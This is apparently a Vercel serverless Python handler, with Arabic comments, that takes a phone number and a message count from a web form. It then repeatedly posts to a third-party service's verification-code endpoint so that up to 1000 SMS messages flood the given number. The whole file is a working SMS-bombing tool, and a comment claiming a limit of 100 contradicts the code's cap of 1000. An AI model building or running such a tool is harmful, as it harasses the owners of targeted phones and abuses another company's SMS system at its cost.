import json
import requests
import time
from http.server import BaseHTTPRequestHandler

# Vercel يتوقع وجود دالة اسمها handler
class handler(BaseHTTPRequestHandler):

    def do_POST(self):
        # 1. قراءة البيانات المرسلة من الواجهة (مثل رقم الهاتف)
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            number = data.get('number')
            sms_count = data.get('sms_count', 1) # قيمة افتراضية 1
        except Exception as e:
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"message": f"خطأ في قراءة البيانات: {e}"}).encode('utf-8'))
            return

        # 2. التحقق من صحة البيانات
        if not (number and number.startswith("01") and len(number) == 11):
            self.send_response(400)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"message": "بيانات غير صحيحة، تأكد من رقم الهاتف"}).encode('utf-8'))
            return

        # 3. تنفيذ الكود الأصلي لإرسال الرسائل
        success_count, failure_count = self.send_sms_requests(number, sms_count)

        # 4. إرسال رد للواجهة الأمامية بالنتيجة
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
        self.wfile.write(json.dumps({"message": response_message}).encode('utf-8'))
        return

    def send_sms_requests(self, number, sms_count):
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        phone_number = "2" + number
        success = 0
        failure = 0

        # تحديد عدد الرسائل بحد أقصى 100 لمنع الاستغلال
        count = min(int(sms_count), 1000)

        for _ in range(count):
            payload = json.dumps({"dial": phone_number})
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Content-Type": "application/json",
            }
            try:
                # وضع مهلة زمنية للطلب لتجنب الانتظار الطويل
                response = requests.post(url, headers=headers, data=payload, timeout=10)
                if response.status_code == 200:
                    success += 1
                else:
                    failure += 1
            except Exception:
                failure += 1
            time.sleep(1) # تأخير بسيط بين الطلبات
        
        return success, failure
